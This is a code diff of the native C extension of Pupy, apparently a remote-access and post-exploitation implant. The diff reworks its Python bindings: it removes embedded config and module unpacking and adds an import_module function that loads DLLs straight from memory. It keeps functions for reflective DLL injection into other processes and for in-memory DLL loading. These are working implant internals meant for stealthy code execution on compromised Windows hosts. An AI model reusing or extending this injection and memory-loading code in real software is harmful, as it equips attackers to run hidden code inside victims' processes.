@@ -3,10 +3,9 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
+#include <windows.h>
 #include "Python-dynload.h"
 #include "debug.h"
-#include <stdio.h>
-#include <windows.h>
 #include "MyLoadLibrary.h"
 #include "base_inject.h"
 
@@ -20,19 +19,9 @@ static char module_doc[] = DOC("Builtins utilities for pupy");
  #endif
 #endif
 
-UINTPTR _load_dll(const char *name, const char *bytes);
-
-//big array to have space for more config / code run at startup. scriptlets also takes more space !
-char pupy_config[65536]="####---PUPY_CONFIG_COMES_HERE---####\n";
-
 static PyObject *ExecError;
 
-extern const DWORD dwPupyArch;
-
 #include "revision.h"
-
-#include "library.c"
-#include "lzmaunpack.c"
 
 #ifdef _PUPY_DLL
 #include "jni_on_load.c"
@@ -67,59 +56,13 @@ static PyObject *Py_set_exit_session_callback(PyObject *self, PyObject *args)
         return PyBool_FromLong(1);
 }
 
-static PyObject *Py_get_modules(PyObject *self, PyObject *args)
-{
-        static PyObject *modules = NULL;
-        if (!modules) {
-                int rc;
-
-                modules = PyDict_lzmaunpack(
-                        library_c_start,
-                        library_c_size
-                );
-                Py_XINCREF(modules);
-        }
-
-        Py_XINCREF(modules);
-        return modules;
-}
-
-static PyObject *
-Py_get_pupy_config(PyObject *self, PyObject *args)
-{
-        static PyObject *config = NULL;
-        if (!config) {
-                union {
-                        unsigned int l;
-                        unsigned char c[4];
-                } len;
-
-                char *uncompressed;
-
-                len.c[3] = pupy_config[0];
-                len.c[2] = pupy_config[1];
-                len.c[1] = pupy_config[2];
-                len.c[0] = pupy_config[3];
-
-                config = PyObject_lzmaunpack(pupy_config+sizeof(int), len.l);
-                memset(pupy_config, 0xFF, len.l);
-
-                Py_XINCREF(config);
-        }
-
-        Py_XINCREF(config);
-        return config;
-}
-
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 {
-        if(dwPupyArch==PROCESS_ARCH_X86){
-                return Py_BuildValue("s", "x86");
-        }
-        else if(dwPupyArch==PROCESS_ARCH_X64){
-                return Py_BuildValue("s", "x64");
-        }
-        return Py_BuildValue("s", "unknown");
+#ifdef _WIN64
+        return Py_BuildValue("s", "x64");
+#else
+        return Py_BuildValue("s", "x86");
+#endif
 }
 
 static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
@@ -153,7 +96,7 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
         if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
                 return NULL;
 
-        return PyLong_FromVoidPtr(_load_dll(dllname, lpDllBuffer));
+        return PyLong_FromVoidPtr(MyLoadLibrary(dllname, lpDllBuffer, NULL));
 }
 
 static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
@@ -169,11 +112,79 @@ static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
         return PyLong_FromVoidPtr(address);
 }
 
+static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
+{
+#ifdef _PUPY_DLL
+        return PyBool_FromLong(1);
+#else
+        return PyBool_FromLong(0);
+#endif
+}
+
+static PyObject *
+import_module(PyObject *self, PyObject *args)
+{
+        char *data;
+        int size;
+        char *initfuncname;
+        char *modname;
+        char *pathname;
+        //HMEMORYMODULE hmem;
+        HMODULE hmem;
+        FARPROC do_init;
+
+        ULONG_PTR cookie = 0;
+        char *oldcontext;
+
+        /* code, initfuncname, fqmodulename, path */
+        if (!PyArg_ParseTuple(args, "s#sss:import_module",
+                              &data, &size,
+                              &initfuncname, &modname, &pathname))
+                return NULL;
+
+        dprint(
+                "import_module(name=%s size=%d ptr=%p)\n",
+                pathname, size, data);
+
+        //try some windows manifest magic...
+        cookie = _My_ActivateActCtx();
+        hmem = MyLoadLibrary(pathname, data, NULL);
+        _My_DeactivateActCtx(cookie);
+
+        if (!hmem) {
+                PyErr_Format(PyExc_ImportError,
+                             "MemoryLoadLibrary failed loading %s (err=%d)",
+                                 pathname, GetLastError());
+                return NULL;
+        }
+
+        do_init = MyGetProcAddress(hmem, initfuncname);
+        if (!do_init) {
+                MyFreeLibrary(hmem);
+                PyErr_Format(PyExc_ImportError,
+                             "Could not find function %s", initfuncname);
+                return NULL;
+        }
+
+    oldcontext = _Py_PackageContext;
+
+        _Py_PackageContext = modname;
+        do_init();
+        _Py_PackageContext = oldcontext;
+
+        if (PyErr_Occurred())
+                return NULL;
+
+        /* Retrieve from sys.modules */
+        return PyImport_ImportModule(modname);
+}
+
 static PyMethodDef methods[] = {
-        { "get_pupy_config", Py_get_pupy_config, METH_NOARGS, DOC("get_pupy_config() -> string") },
+        { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
         { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
-        { "get_modules", Py_get_modules, METH_NOARGS, DOC("get pupy modules") },
         { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, DOC("reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure") },
+        { "import_module", import_module, METH_VARARGS,
+          "import_module(data, size, initfuncname, path) -> module" },
         { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
         { "set_exit_session_callback", Py_set_exit_session_callback, METH_VARARGS, DOC("set_exit_session_callback(function)")},
         { "find_function_address", Py_find_function_address, METH_VARARGS,
@@ -182,15 +193,15 @@ static PyMethodDef methods[] = {
 };
 
 DL_EXPORT(void)
-initpupy(void)
+init_pupy(void)
 {
-        PyObject *pupy = Py_InitModule3("pupy", methods, module_doc);
+        PyObject *pupy = Py_InitModule3("_pupy", methods, module_doc);
         if (!pupy) {
                 return;
         }
 
         PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
-        ExecError = PyErr_NewException("pupy.error", NULL, NULL);
+        ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
         Py_INCREF(ExecError);
         PyModule_AddObject(pupy, "error", ExecError);
 
